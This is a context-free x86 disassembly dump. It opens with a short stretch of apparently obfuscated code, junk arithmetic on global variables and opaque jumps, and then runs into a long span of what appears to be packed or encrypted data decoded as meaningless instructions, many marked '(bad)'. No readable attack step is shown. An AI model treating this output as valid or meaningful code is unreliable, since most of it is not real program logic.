  4169d5:	mov    ebx,DWORD PTR ds:0x428eab
  4169db:	inc    ebx
  4169dc:	mov    DWORD PTR ds:0x428eab,ebx
  4169e2:	jmp    0x41698f
  4169e7:	mov    ebx,0xfa5e1522
  4169ec:	or     DWORD PTR ds:0x428e7b,0x3b15
  4169f6:	sub    ebx,edx
  4169f8:	add    ebx,DWORD PTR [ebp-0x44]
  4169fb:	mov    DWORD PTR [ebp-0x44],ebx
  4169fe:	mov    edx,DWORD PTR ds:0x428e8f
  416a04:	xor    edx,DWORD PTR ds:0x428e27
  416a0a:	mov    DWORD PTR ds:0x428e8f,edx
  416a10:	mov    edx,DWORD PTR [ebp+0x8]
  416a13:	xor    edx,eax
  416a15:	add    edx,esi
  416a17:	jne    0x416767
  416a1d:	mov    DWORD PTR ds:0x428ea3,0x25d2
  416a27:	jmp    0x4191f8
  416a2c:	mov    edx,DWORD PTR [ebp-0xc]
  416a2f:	xor    ebx,ebx
  416a31:	or     ebx,DWORD PTR ds:0x428ea3
  416a37:	xor    ebx,DWORD PTR ds:0x428ea7
  416a3d:	mov    DWORD PTR ds:0x428ea3,ebx
  416a43:	sub    edx,esi
  416a45:	xor    edx,eax
  416a47:	sbb    ebx,DWORD PTR ds:0x428e87
  416a4d:	mov    DWORD PTR [ebp-0x5c],edx
  416a50:	jmp    0x418e09
  416a55:	out    0xe2,al
  416a57:	dec    edx
  416a58:	mov    dl,0x46
  416a5a:	stos   BYTE PTR es:[edi],al
  416a5b:	xchg   BYTE PTR [esi+0x2de23c83],dl
  416a61:	inc    ebp
  416a62:	sbb    dl,0x48
  416a65:	stc    
  416a66:	inc    esp
  416a67:	add    BYTE PTR [ebx-0x7c7c9f19],0x30
  416a6e:	add    bh,ch
  416a70:	adc    eax,DWORD PTR [ebp-0x3c]
  416a73:	jnp    0x416ab4
  416a75:	loopne 0x416aee
  416a77:	inc    esi
  416a78:	jb     0x416add
  416a7a:	and    BYTE PTR [ebp-0x5cccef5],0xf
  416a81:	shl    DWORD PTR fs:[ecx],1
  416a84:	mov    ecx,DWORD PTR gs:[ebx+edx*1+0x19]
  416a89:	lock or ebx,DWORD PTR [ebp-0x8]
  416a8d:	div    BYTE PTR [edi]
  416a8f:	xchg   DWORD PTR [ecx+0x45cd49d3],esp
  416a95:	mov    ebx,0x3ebd74e4
  416a9a:	aam    0x98
  416a9c:	jns    0x416ae5
  416a9e:	xchg   edx,eax
  416a9f:	jae    0x416ac9
  416aa1:	cdq    
  416aa2:	jno    0x416a53
  416aa4:	cs aad 0xe
  416aa7:	fs xchg esp,eax
  416aa9:	cmp    eax,0x7e29b4c
  416aae:	dec    esp
  416aaf:	sbb    eax,0x54073517
  416ab4:	mov    ecx,0x83b1f7e9
  416ab9:	or     BYTE PTR [edx-0x913a70f],dh
  416abf:	mov    al,0xe
  416ac1:	in     eax,0x7c
  416ac3:	push   esp
  416ac4:	or     ecx,edi
  416ac6:	idiv   BYTE PTR [ebx+0x3a893221]
  416acc:	ds fwait
  416ace:	rcr    BYTE PTR [ecx+0x7bb3c68],1
  416ad4:	push   0x4d218e4e
  416ad9:	cmp    eax,0x58d828a
  416ade:	mov    cl,0xb0
  416ae0:	push   ds
  416ae1:	push   es
  416ae2:	jnp    0x416a8f
  416ae4:	mov    ds:0xc74857f5,eax
  416ae9:	dec    ecx
  416aea:	and    DWORD PTR [ebx+0x41abbf61],0xcaf08d74
  416af4:	pop    edi
  416af5:	call   0x6bdf:0x9759ee2e
  416afc:	sbb    BYTE PTR [ecx+eax*4+0x4a],bl
  416b00:	pop    edi
  416b01:	xchg   edi,eax
  416b02:	add    DWORD PTR [edx+0x5372c5d9],ecx
  416b08:	mov    esi,0x5525031c
  416b0d:	mov    al,ds:0xcd410239
  416b12:	mov    ecx,0xef043863
  416b17:	xor    bh,ch
  416b19:	mov    al,ds:0x2f798aaf
  416b1e:	jns    0x416b3b
  416b20:	out    dx,al
  416b21:	dec    ebx
  416b22:	mov    eax,ds:0x426a5cfc
  416b27:	inc    esi
  416b28:	sahf   
  416b29:	xchg   edi,eax
  416b2a:	mov    dh,0x42
  416b2c:	lea    ebp,ds:0x80ef42ee
  416b32:	ss cli 
  416b34:	dec    esp
  416b35:	dec    esp
  416b36:	ror    BYTE PTR [edx+eax*4+0x2d32551],0xd6
  416b3e:	(bad)  
  416b3f:	push   0x6102ec67
  416b44:	inc    edi
  416b45:	loop   0x416b44
  416b47:	pop    edi
  416b48:	outs   dx,DWORD PTR ds:[esi]
  416b49:	add    ch,BYTE PTR [ebx-0x58]
  416b4c:	adc    DWORD PTR [esi],edx
  416b4e:	hlt    
  416b4f:	mov    al,BYTE PTR [ecx-0x1ba9111d]
  416b55:	aad    0x65
  416b57:	xor    DWORD PTR [ebp+ebx*8-0x6e],ebp
  416b5b:	in     eax,0x81
  416b5d:	call   0xaadb:0x5ed6c6e8
  416b64:	pushf  
  416b65:	lock stc 
  416b67:	push   edi
  416b68:	jmp    0x416b6d
  416b6a:	fidivr DWORD PTR [ebp+0x620663dc]
  416b70:	sahf   
  416b71:	adc    BYTE PTR [edx+eax*2],0x34
  416b75:	lahf   
  416b76:	dec    esp
  416b77:	fsub   QWORD PTR [edi+ebp*8-0x28]
  416b7b:	scas   al,BYTE PTR es:[edi]
  416b7c:	pop    esp
  416b7d:	jo     0x416b09
  416b7f:	xchg   ebx,eax
  416b80:	bound  ebp,QWORD PTR [eax+0xb]
  416b83:	jg     0x416bf0
  416b85:	fwait
  416b86:	lea    edi,[esi+edx*4-0x1ff8d084]
  416b8d:	jg     0x416b24
  416b8f:	dec    edi
  416b90:	icebp  
  416b91:	lods   eax,DWORD PTR ds:[esi]
  416b92:	and    esp,eax
  416b94:	cli    
  416b95:	sub    esp,DWORD PTR [edx+0x38838f53]
  416b9b:	or     BYTE PTR [edx+edi*1+0x10a64ea7],dl
  416ba2:	xor    ebx,DWORD PTR [ecx-0x6b]
  416ba5:	and    BYTE PTR [esp+ebx*8+0x5c],ah
  416ba9:	adc    al,BYTE PTR [edi]
  416bab:	pop    ss
  416bac:	sbb    DWORD PTR [ecx+0x2b9c7343],edi
  416bb2:	xor    bh,BYTE PTR [esi+0x37]
  416bb5:	push   ds
  416bb6:	mov    BYTE PTR [eax],bh
  416bb8:	push   esp
  416bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bba:	add    ch,dh
  416bbc:	xchg   ecx,eax
  416bbd:	lahf   
  416bbe:	mov    esi,0xbb22fb0e
  416bc3:	cmp    dl,bl
  416bc5:	shl    dl,cl
  416bc7:	cmp    eax,0xc66620f0
  416bcc:	mov    DWORD PTR [esi+eax*4+0x2b2f1306],edx
  416bd3:	ret    0x679c
  416bd6:	xchg   esi,eax
  416bd7:	xchg   edx,eax
  416bd8:	or     BYTE PTR [esi+edi*8-0x61],ah
  416bdc:	jnp    0x416c25
  416bde:	cdq    
  416bdf:	mov    esi,0xb03ec6e0
  416be4:	call   FWORD PTR [eax-0xa1b30c3]
  416bea:	mov    ebp,0xc43a61db
  416bef:	mov    ecx,0x9b7339e2
  416bf4:	pop    ebp
  416bf5:	test   eax,0x16fca8c4
  416bfa:	ins    DWORD PTR es:[edi],dx
  416bfb:	mov    ah,0x34
  416bfd:	(bad)  
  416bfe:	in     eax,dx
  416bff:	adc    DWORD PTR [ebp-0x70],esp
  416c02:	imul   esp,DWORD PTR ds:0xe64bc1a1,0xffffffe5
  416c09:	push   eax
  416c0a:	mov    bl,0x2
  416c0c:	ins    BYTE PTR es:[edi],dx
  416c0d:	scas   al,BYTE PTR es:[edi]
  416c0e:	xchg   esp,eax
  416c0f:	mov    dh,bl
  416c11:	push   es
  416c12:	sub    BYTE PTR [ebp-0x1710910d],bh
  416c18:	push   0x3c
  416c1a:	jmp    0x35279303
  416c1f:	jnp    0x416c37
  416c21:	ret    
  416c22:	out    dx,eax
  416c23:	ja     0x416c54
  416c25:	pop    es
  416c26:	pop    ebp
  416c27:	repnz adc dl,dl
  416c2a:	jb     0x416c8f
  416c2c:	xor    DWORD PTR [edx],esi
  416c2e:	retf   
  416c2f:	cmc    
  416c30:	jmp    0xc28f:0x22e945e7
  416c37:	inc    esi
  416c38:	xor    esi,DWORD PTR [ebp-0xf]
  416c3b:	fdivr  st,st(5)
  416c3d:	lea    esp,[ebx-0x79]
  416c40:	sahf   
  416c41:	ficomp WORD PTR [eax-0x74]
  416c44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c45:	mul    BYTE PTR [ebx-0x6f]
  416c48:	jb     0x416c32
  416c4a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c4b:	xchg   ecx,eax
  416c4c:	or     BYTE PTR [ebx-0x55],ch
  416c4f:	cld    
  416c50:	ja     0x416ca1
  416c52:	dec    edi
  416c53:	shr    BYTE PTR [ebp+0x610ef373],cl
  416c59:	sbb    esp,DWORD PTR [edi-0x33]
  416c5c:	mov    ecx,0xd67bb24d
  416c61:	je     0x416c6a
  416c63:	adc    BYTE PTR [edi+0x4feab5d2],bh
  416c69:	inc    ecx
  416c6a:	and    BYTE PTR [ecx+0x1e],0x78
  416c6e:	fisubr WORD PTR [edx]
  416c70:	mov    DWORD PTR [edx-0x4e04e78e],0x17508824
  416c7a:	outs   dx,DWORD PTR ds:[esi]
  416c7b:	mov    cl,0x8a
  416c7d:	retf   
  416c7e:	cmp    eax,esi
  416c80:	jne    0x416c26
  416c82:	and    eax,0x36b37827
  416c87:	(bad)  [ecx+0x5967f4d6]
  416c8d:	xor    DWORD PTR [esi+ecx*2],edx
  416c90:	push   eax
  416c91:	sar    DWORD PTR [ebx],cl
  416c93:	mov    ebx,0xabb08f2f
  416c98:	ret    
  416c99:	jno    0x416c5f
  416c9b:	test   DWORD PTR [eax],0x6bb9a624
  416ca1:	sbb    al,0x4b
  416ca3:	sbb    DWORD PTR [edx-0x3],ebp
  416ca6:	cwde   
  416ca7:	cmp    BYTE PTR [ecx+0x63],dl
  416caa:	mov    eax,0x4c0b95ea
  416caf:	mov    ss,esp
  416cb1:	loop   0x416cec
  416cb3:	ja     0x416c57
  416cb5:	xchg   BYTE PTR [esi-0x4aacc5d9],cl
  416cbb:	push   0xffffffa4
  416cbd:	rol    ebx,0xff
  416cc0:	retf   0x48bc
  416cc3:	es xchg ebp,eax
  416cc5:	call   0xcd4:0x7b81c08e
  416ccc:	fmul   st(3),st
  416cce:	pop    esp
  416ccf:	jo     0x416c82
  416cd1:	sub    eax,0x742dfae
  416cd6:	call   0x5db98d0c
  416cdb:	xchg   ebp,eax
  416cdc:	addr16 cmc 
  416cde:	(bad)  
  416cdf:	fwait
  416ce0:	popf   
  416ce1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ce2:	psubd  mm0,QWORD PTR [edx]
  416ce5:	or     esp,DWORD PTR [ebx+edx*2+0x1617514f]
  416cec:	ror    BYTE PTR [esi-0x1bd67399],cl
  416cf2:	icebp  
  416cf3:	xchg   edx,eax
  416cf4:	ins    BYTE PTR es:[edi],dx
  416cf5:	pop    edx
  416cf6:	sbb    edi,DWORD PTR [edi-0x288ed144]
  416cfc:	ret    
  416cfd:	xchg   esp,eax
  416cfe:	mov    cl,0x4a
  416d00:	cdq    
  416d01:	test   BYTE PTR [esp+ecx*8],0x85
  416d05:	inc    esi
  416d06:	add    BYTE PTR [eax],cl
  416d08:	mov    cs,WORD PTR [esi-0x47]
  416d0b:	(bad)  
  416d0c:	loopne 0x416cbe
  416d0e:	mov    DWORD PTR [esi+0x5d3f327e],ebp
  416d14:	push   ebp
  416d15:	jp     0x416d54
  416d17:	shl    BYTE PTR [eax+0x30bcb865],1
  416d1d:	jmp    0xe620:0x537cfdb
  416d24:	aas    
  416d25:	ds in  al,0x7
  416d28:	dec    edi
  416d29:	mov    esi,0xa22a89a6
  416d2e:	inc    edx
  416d2f:	rcr    BYTE PTR fs:[edx-0x9],1
  416d33:	aam    0xc7
  416d35:	prefetchwt1 BYTE PTR [ebp+0x27]
  416d39:	dec    edi
  416d3a:	jnp    0x416dab
  416d3c:	mov    esp,0xae5e5ce3
  416d41:	addr16 into 
  416d43:	and    BYTE PTR [ebp+0x6c],0xcf
  416d47:	xlat   BYTE PTR ds:[ebx]
  416d48:	jl     0x416d33
  416d4a:	dec    ecx
  416d4b:	pop    esp
  416d4c:	mov    cl,0x30
  416d4e:	xchg   esp,eax
  416d4f:	xchg   ecx,eax
  416d50:	xchg   edx,eax
  416d51:	clc    
  416d52:	cmp    al,BYTE PTR [eax-0x565747b3]
  416d58:	loop   0x416d70
  416d5a:	xor    DWORD PTR ds:0x46901634,esi
  416d60:	push   ebx
  416d61:	push   ebp
  416d62:	aaa    
  416d63:	and    BYTE PTR [ebp+esi*1-0x3c],bh
  416d67:	in     eax,0x34
  416d69:	jae    0x416d9a
  416d6b:	ror    DWORD PTR [edi-0x31161dfe],cl
  416d71:	adc    esi,DWORD PTR [edi-0x77]
  416d74:	test   DWORD PTR [edi],esi
  416d76:	adc    ch,BYTE PTR [edi]
  416d78:	(bad)  
  416d79:	popa   
  416d7a:	out    0x7d,al
  416d7c:	and    ch,BYTE PTR [ecx]
  416d7e:	addr16 test bl,ah
  416d81:	sub    ebx,ebx
  416d83:	(bad)  
  416d84:	outs   dx,BYTE PTR ds:[esi]
  416d85:	pop    edi
  416d86:	add    eax,0x2bbd99e0
  416d8b:	rol    ebp,1
  416d8d:	inc    edx
  416d8e:	ficomp WORD PTR [esi]
  416d90:	std    
  416d91:	pushf  
  416d92:	adc    BYTE PTR [ebp-0x46],0x6c
  416d96:	dec    ebx
  416d97:	sub    ch,dl
  416d99:	add    bl,BYTE PTR [esi-0x63]
  416d9c:	jge    0x416dfe
  416d9e:	mov    fs,WORD PTR [eax+0x395b070]
  416da4:	inc    edx
  416da5:	mov    ebx,0x5d8686c5
  416daa:	sahf   
  416dab:	add    DWORD PTR [ebx-0x47],ebp
  416dae:	clc    
  416daf:	bnd jle 0x416dd4
  416db2:	or     eax,0xd6a23671
  416db7:	xor    eax,0x928ba664
  416dbc:	mov    WORD PTR [esp+eax*8-0x24],ss
  416dc0:	pop    eax
  416dc1:	mov    dl,0xa4
  416dc3:	mov    ch,0x3f
  416dc5:	inc    ebp
  416dc6:	xchg   edx,eax
  416dc7:	fnstenv [esi+esi*1]
  416dca:	push   ds
  416dcb:	stc    
  416dcc:	inc    edi
  416dcd:	leave  
  416dce:	sub    eax,0xee12c6b8
  416dd3:	(bad)  [ebx-0x310a4200]
  416dd9:	jp     0x416e31
  416ddb:	push   cs
  416ddc:	xchg   BYTE PTR [eax+0x41],bl
  416ddf:	xchg   ecx,eax
  416de0:	pop    ebx
  416de1:	fisub  DWORD PTR [edi]
  416de3:	cmp    al,0x76
  416de5:	mov    dl,0x16
  416de7:	cmp    DWORD PTR [edx],ebp
  416de9:	sub    BYTE PTR [ebp-0x4d96efce],bh
  416def:	fist   DWORD PTR [eax-0x39]
  416df2:	imul   edx,DWORD PTR [eax-0x68fd8d3b],0x86addf2f
  416dfc:	call   DWORD PTR [edi-0x4f3af529]
  416e02:	or     DWORD PTR [ebx+0x2],edx
  416e05:	jo     0x416df6
  416e07:	pusha  
  416e08:	mov    edi,0x42e1f752
  416e0d:	jmp    0xf6ac:0xda6fb7ef
  416e14:	loop   0x416e7b
  416e16:	jle    0x416e03
  416e18:	mov    al,BYTE PTR [ebp-0x136e58ce]
  416e1e:	jb     0x416db7
  416e20:	stos   DWORD PTR es:[edi],eax
  416e21:	repnz test BYTE PTR [eax+0x69],ah
  416e25:	sbb    DWORD PTR [ecx+0x2442dd5c],ebp
  416e2b:	pop    ss
  416e2c:	cs cmp al,0xbd
  416e2f:	mov    ecx,0xf5d2b1c9
  416e34:	imul   edi
  416e36:	mov    ch,0x1
  416e38:	jg     0x416e38
  416e3a:	mov    ebp,0x779d952c
  416e3f:	lds    ecx,FWORD PTR [eax+0x41]
  416e42:	jbe    0x416eac
  416e44:	jge    0x416eb2
  416e46:	add    DWORD PTR [ebx-0x2d8c0492],edi
  416e4c:	mov    BYTE PTR [edi],bl
  416e4e:	lahf   
  416e4f:	das    
  416e50:	icebp  
  416e51:	inc    ebp
  416e52:	in     eax,0xbd
  416e54:	mov    ds:0x6d2a9753,al
  416e59:	inc    ebp
  416e5a:	sbb    ah,cl
  416e5c:	stos   BYTE PTR es:[edi],al
  416e5d:	mov    dh,0xc1
  416e5f:	pop    ecx
  416e60:	mov    bh,0x45
  416e62:	test   al,0x98
  416e64:	ins    BYTE PTR es:[edi],dx
  416e65:	popf   
  416e66:	add    al,0x77
  416e68:	dec    eax
  416e69:	clc    
  416e6a:	sahf   
  416e6b:	or     al,0x21
  416e6d:	adc    al,0xa5
  416e6f:	adc    esp,DWORD PTR [ebx-0x5]
  416e72:	(bad)  
  416e73:	ins    DWORD PTR es:[edi],dx
  416e74:	jg     0x416eeb
  416e76:	add    ebp,eax
  416e78:	jbe    0x416e16
  416e7a:	mov    al,0x9c
  416e7c:	fsubr  DWORD PTR [edx]
  416e7e:	js     0x416e7d
  416e80:	fwait
  416e81:	add    ebp,DWORD PTR [edx+0x60]
  416e84:	push   ebx
  416e85:	mov    dh,0xc3
  416e87:	jnp    0x416ebb
  416e89:	push   edi
  416e8a:	sbb    DWORD PTR [ecx-0xd35a8a0],esp
  416e90:	fsub   st(6),st
  416e92:	xor    eax,0x258cb8c9
  416e97:	jmp    0x3f48:0xb1f9665b
  416e9e:	in     al,dx
  416e9f:	push   0x10b27d5b
  416ea4:	pop    eax
  416ea5:	jne    0x416e64
  416ea7:	xor    ebx,DWORD PTR [ebx+0x6a]
  416eaa:	idiv   BYTE PTR [ecx]
  416eac:	or     bl,al
  416eae:	fdivp  st(2),st
  416eb0:	add    bh,BYTE PTR [ebx+edi*8-0x38889dc8]
  416eb7:	fwait
  416eb8:	ret    
  416eb9:	sahf   
  416eba:	or     BYTE PTR [ebx],bl
  416ebc:	inc    esp
  416ebd:	push   ebp
  416ebe:	cmp    eax,0x6ed4644f
  416ec3:	out    0x57,eax
  416ec5:	rol    BYTE PTR [ecx-0xe],0x71
  416ec9:	pop    ds
  416eca:	fst    QWORD PTR [edi-0x4d649054]
  416ed0:	mov    bh,0xd2
  416ed2:	add    dl,BYTE PTR [eax+0x38]
  416ed5:	stos   DWORD PTR es:[edi],eax
  416ed6:	push   eax
  416ed7:	(bad)  
  416ed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ed9:	imul   edx,DWORD PTR [eax+0x25],0xdcb95a43
  416ee0:	fdiv   st(0),st
  416ee2:	shr    cl,0x9a
  416ee5:	stos   DWORD PTR es:[edi],eax
  416ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416ee8:	fs ret 
  416eea:	popf   
  416eeb:	mov    edx,0xf483582a
  416ef0:	mov    dl,0xa8
  416ef2:	mov    ch,cl
  416ef4:	add    al,ch
  416ef6:	iret   
  416ef7:	adc    dh,bh
  416ef9:	dec    ebx
  416efa:	mov    dh,0x41
  416efc:	xor    edi,DWORD PTR [edx+0x19697fe2]
  416f02:	sub    bl,BYTE PTR [edx-0xf]
  416f05:	shr    BYTE PTR [ebx+0x460fcf64],0x7d
  416f0c:	or     DWORD PTR [eax-0x2a],edi
  416f0f:	jb     0x416ed5
  416f11:	shr    DWORD PTR [ebx+ebx*2+0x20],1
  416f15:	push   ecx
  416f16:	icebp  
  416f17:	mov    ds:0x14d74a33,eax
  416f1c:	popf   
  416f1d:	lods   eax,DWORD PTR ds:[esi]
  416f1e:	sbb    ebp,DWORD PTR [ecx+0x7a]
  416f21:	add    DWORD PTR [ebx],esp
  416f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f24:	sbb    eax,0x2b9b0140
  416f29:	xchg   ebp,eax
  416f2a:	jge    0x416eec
  416f2c:	xchg   ebx,eax
  416f2d:	arpl   WORD PTR [esi+eax*4-0xc2d9a2f],bx
  416f34:	cmp    DWORD PTR [ecx+0x45a0ea5f],ebp
  416f3a:	cli    
  416f3b:	mov    ah,0xbc
  416f3d:	cmp    al,0xfc
  416f3f:	pop    ss
  416f40:	das    
  416f41:	mov    eax,0x76513dbb
  416f46:	inc    ebx
  416f47:	das    
  416f48:	mov    ecx,0x1d37a4c0
  416f4d:	mov    dl,BYTE PTR [edx+0x16]
  416f50:	fiadd  DWORD PTR [edx-0x37]
  416f53:	mov    ss,ebx
  416f55:	or     eax,0xd819acbe
  416f5a:	mov    eax,ds:0xf3487b99
  416f5f:	add    DWORD PTR [esi+0x2218e2eb],edi
  416f65:	stc    
  416f66:	lods   eax,DWORD PTR ds:[esi]
  416f67:	adc    bh,dh
  416f69:	lahf   
  416f6a:	jecxz  0x416fb8
  416f6c:	outs   dx,BYTE PTR ds:[esi]
  416f6d:	mov    al,ds:0xdbbe64dc
  416f72:	push   ecx
  416f73:	push   esp
  416f74:	mov    ds:0xe40358a5,eax
  416f79:	out    0x54,eax
  416f7b:	daa    
  416f7c:	sub    BYTE PTR [ecx-0x6d],bh
  416f7f:	add    ah,dh
  416f81:	push   eax
  416f82:	dec    ecx
  416f83:	nop
  416f84:	pushf  
  416f85:	sar    DWORD PTR [eax+0x17c4cf9d],1
  416f8b:	(bad)  
  416f8d:	mov    edx,0x60601d8
  416f92:	ret    0xdb11
  416f95:	(bad)  
  416f96:	mov    BYTE PTR [eax-0x5a],dl
  416f99:	sbb    BYTE PTR [esi+0x17ddd099],ah
  416f9f:	mov    cl,0xf0
  416fa1:	and    DWORD PTR [eax],ecx
  416fa3:	dec    ebx
  416fa4:	cli    
  416fa5:	aas    
  416fa6:	and    DWORD PTR [eax],ecx
  416fa8:	inc    esi
  416fa9:	fidiv  DWORD PTR [ebp-0x4dc2f75]
  416faf:	loopne 0x416f80
  416fb1:	cmp    DWORD PTR [edx+0x25],esp
  416fb4:	jle    0x416fb1
  416fb6:	scas   eax,DWORD PTR es:[edi]
  416fb7:	dec    edi
  416fb8:	dec    esi
  416fb9:	ds mov edx,0xfd16a2b1
  416fbf:	fidivr DWORD PTR [ecx+0x0]
  416fc2:	mov    al,0xc9
  416fc4:	mov    WORD PTR [edi],es
  416fc6:	cmp    bl,0xba
  416fc9:	ss jmp 0x416f88
  416fcc:	mov    eax,ds:0xd74ec66a
  416fd1:	lahf   
  416fd2:	xor    DWORD PTR [esi],edi
  416fd4:	cmp    al,0xe0
  416fd6:	mov    esp,0xa0d0c8d5
  416fdb:	inc    eax
  416fdc:	test   BYTE PTR [edi],ah
  416fde:	add    al,BYTE PTR [edx-0x27]
  416fe1:	loop   0x416fb8
  416fe3:	pop    ds
  416fe4:	nop
  416fe5:	imul   esp,DWORD PTR [esi],0x5
  416fe8:	mov    ecx,0xa9aba09a
  416fed:	mov    bh,0x9e
  416fef:	jns    0x416f7f
  416ff1:	loope  0x416fcd
  416ff3:	sub    BYTE PTR [ecx+0x6b],ah
  416ff6:	xlat   BYTE PTR ds:[ebx]
  416ff7:	inc    esp
  416ff8:	mov    edx,0xaef03c0d
  416ffd:	loopne 0x41706b
  416fff:	rol    esi,cl
  417001:	jmp    0xb33e0678
  417006:	cli    
  417007:	not    bh
  417009:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41700a:	hlt    
  41700b:	ins    BYTE PTR es:[edi],dx
  41700c:	loop   0x417089
  41700e:	or     al,0x9d
  417010:	mov    ebx,0x8d069df5
  417015:	jmp    0xd8711f2e
  41701a:	adc    edi,edx
  41701c:	or     dh,al
  41701e:	mov    dh,0xb2
  417020:	ja     0x416fa6
  417022:	xor    DWORD PTR [ecx-0x73dd91b0],esi
  417028:	cwde   
  417029:	adc    esp,esi
  41702b:	sub    bh,BYTE PTR [ecx]
  41702d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41702e:	cmp    ah,BYTE PTR [esi]
  417030:	cwde   
  417031:	(bad)
  417034:	push   ds
  417035:	or     bl,BYTE PTR [edi+ebx*2+0x58f5b7d0]
  41703c:	xor    BYTE PTR [ecx+0x17],0xdf
  417040:	inc    edx
  417041:	xor    eax,0x7ead9512
  417046:	dec    edi
  417047:	lahf   
  417048:	sub    esi,0x67d118de
  41704e:	mov    dh,0x66
  417050:	pop    ds
  417051:	mov    cl,0xb0
  417053:	hlt    
  417054:	xor    cl,bl
  417056:	xchg   ebp,eax
  417057:	sbb    eax,0x2d2e5b89
  41705c:	ficomp WORD PTR [ebx+0x26d13eb3]
  417062:	mov    edx,0x3a35e825
  417067:	cwde   
  417068:	pushf  
  417069:	sub    BYTE PTR [ebx+0x6c],0xa8
  41706d:	lea    ebx,[edi*4+0x520ff2]
  417074:	hlt    
  417075:	mov    eax,ds:0x44f4223
  41707a:	xor    DWORD PTR [edx-0x47],esi
  41707d:	add    al,0x16
  41707f:	das    
  417080:	dec    edi
  417081:	inc    edx
  417082:	(bad)  
  417083:	call   FWORD PTR [edi]
  417085:	push   ebp
  417086:	mov    ebx,0x7a0a6cfd
  41708b:	pop    eax
  41708c:	test   DWORD PTR [edi-0x7cf9f09f],ebp
  417092:	imul   esi,DWORD PTR [edi-0x514029f],0x61
  417099:	jecxz  0x41702a
  41709b:	outs   dx,BYTE PTR ds:[esi]
  41709c:	ss jp  0x41709b
  41709f:	fisubr DWORD PTR [edx-0x62dbd382]
  4170a5:	ds sahf 
  4170a7:	(bad)  
  4170a9:	imul   ebx,DWORD PTR [esi],0x13df7518
  4170af:	hlt    
  4170b0:	cmc    
  4170b1:	jl     0x4170f7
  4170b3:	scas   eax,DWORD PTR es:[edi]
  4170b4:	in     al,0x5c
  4170b6:	adc    DWORD PTR [ebx-0x80],ebp
  4170b9:	add    ecx,DWORD PTR [ecx-0x507f55a]
  4170bf:	cwde   
  4170c0:	push   es
  4170c1:	std    
  4170c2:	and    eax,0x716d1d95
  4170c7:	cmp    ebx,DWORD PTR [edi]
  4170c9:	fadd   QWORD PTR [ecx-0x6512decd]
  4170cf:	loope  0x4170ce
  4170d1:	call   0xf83bc9dd
  4170d6:	cmp    al,0x1e
  4170d8:	scas   eax,DWORD PTR es:[edi]
  4170d9:	jmp    0x4170cf
  4170db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170dc:	sub    BYTE PTR [ebx-0x6a],bh
  4170df:	push   esp
  4170e0:	dec    esi
  4170e1:	rol    DWORD PTR [edx+0x2dc7815b],cl
  4170e7:	mov    ah,0xa4
  4170e9:	dec    eax
  4170ea:	jmp    0xb796:0x3ef055ae
  4170f1:	sbb    eax,0xc62c4556
  4170f6:	inc    esi
  4170f7:	inc    ecx
  4170f8:	inc    eax
  4170f9:	or     al,0x6b
  4170fb:	push   edx
  4170fc:	cs cmc 
  4170fe:	fwait
  4170ff:	push   ecx
  417100:	int3   
  417101:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417102:	arpl   WORD PTR [eax],bp
  417104:	xlat   BYTE PTR ds:[ebx]
  417105:	xchg   esi,eax
  417106:	mov    ah,BYTE PTR [eax-0x6dad31c4]
  41710c:	push   eax
  41710d:	das    
  41710e:	not    eax
  417110:	fistp  WORD PTR [esi]
  417112:	cmp    edx,esp
  417114:	mov    cl,0x84
  417116:	sub    al,0xde
  417118:	hlt    
  417119:	pop    ds
  41711a:	fstp   DWORD PTR [ecx+0x21ede87e]
  417120:	das    
  417121:	xchg   esi,eax
  417122:	or     al,0x8d
  417124:	inc    ebx
  417125:	bound  esp,QWORD PTR [esi-0x64ab9b78]
  41712b:	ins    DWORD PTR es:[edi],dx
  41712c:	aad    0x91
  41712e:	or     al,0x7
  417130:	jmp    0x4171b1
  417132:	xor    edi,esi
  417134:	rol    DWORD PTR [ecx+0x27],0x27
  417138:	jmp    0x1358a9c8
  41713d:	lea    edi,[edx]
  41713f:	push   ebx
  417140:	mov    ebp,0xcae536f1
  417145:	lods   eax,DWORD PTR ds:[esi]
  417146:	mov    BYTE PTR [ebp+0x1f],ah
  417149:	ins    BYTE PTR es:[edi],dx
  41714a:	add    eax,0xb4840c3e
  41714f:	cmp    eax,0x423abb19
  417154:	sbb    eax,0x441408e0
  417159:	or     eax,0x546d27a3
  41715e:	clc    
  41715f:	xchg   ecx,eax
  417160:	add    cl,0xc2
  417163:	(bad)  
  417164:	les    ebx,FWORD PTR [eax+0x250c2229]
  41716a:	rcr    al,0x33
  41716d:	sub    bl,BYTE PTR [ebx+eiz*2+0x5]
  417171:	or     BYTE PTR [eax+0x63],bh
  417174:	push   ds
  417175:	push   0xe3a6b875
  41717a:	adc    esi,eax
  41717c:	adc    edx,DWORD PTR [ecx]
  41717e:	xchg   edx,eax
  41717f:	(bad)  
  417180:	dec    esi
  417181:	xchg   edi,eax
  417182:	add    BYTE PTR [edx],bh
  417184:	test   al,0x93
  417186:	jae    0x417201
  417188:	push   cs
  417189:	cmp    BYTE PTR [edx+0x3b],ah
  41718c:	push   0x2a
  41718e:	retf   
  41718f:	sub    al,0x25
  417191:	cwde   
  417192:	fsubr  DWORD PTR [ebx]
  417194:	mov    BYTE PTR [ecx-0x63],bl
  417197:	add    BYTE PTR [ebp-0x3c03fff4],bl
  41719d:	inc    ecx
  41719e:	fidivr WORD PTR [edx-0x3e]
  4171a1:	pushf  
  4171a2:	(bad)  
  4171a3:	fwait
  4171a4:	out    0x8,eax
  4171a6:	push   ss
  4171a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171a8:	aad    0x19
  4171aa:	stos   DWORD PTR es:[edi],eax
  4171ab:	loop   0x4171c8
  4171ad:	jle    0x417175
  4171af:	mov    bl,0xdd
  4171b1:	mov    dl,0xe2
  4171b3:	adc    ecx,ebx
  4171b5:	scas   eax,DWORD PTR es:[edi]
  4171b6:	mov    edx,0xa7bc2b33
